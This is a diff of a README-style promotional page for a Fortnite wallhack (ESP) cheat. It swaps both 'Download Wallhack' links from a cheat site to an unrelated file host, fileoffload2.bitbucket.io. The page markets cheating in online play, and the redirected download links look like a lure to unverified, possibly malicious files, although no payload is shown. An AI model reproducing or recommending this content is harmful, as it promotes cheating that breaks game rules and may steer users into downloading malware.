@@ -4,7 +4,7 @@ Sick of getting third-partied from behind a rock or boxed by a camper with a gol
 
 This isn’t just about vision—it’s a tactical advantage that’ll let you **read the entire map like The Matrix**. Welcome to the cheat that separates the cracked from the clueless 👑
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://wecheaters.github.io/cheats/fortnite/)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload2.bitbucket.io)
 ---
 
 ## 🔍 What Is Fortnite Wallhack?
@@ -19,7 +19,7 @@ A wallhack, or ESP (Extra Sensory Perception), overlays in-game data directly on
 
 And the best part? You never have to guess again. Peek with confidence and play 10 steps ahead every time.
 
-[![Download Wallhack](https://i.ytimg.com/vi/sAgwAmmBjjc/maxresdefault.jpg)](https://wecheaters.github.io/cheats/fortnite/)
+[![Download Wallhack](https://i.ytimg.com/vi/sAgwAmmBjjc/maxresdefault.jpg)](https://fileoffload2.bitbucket.io)
 ---
 
 ## 💡 Key Features of the Wallhack Tool
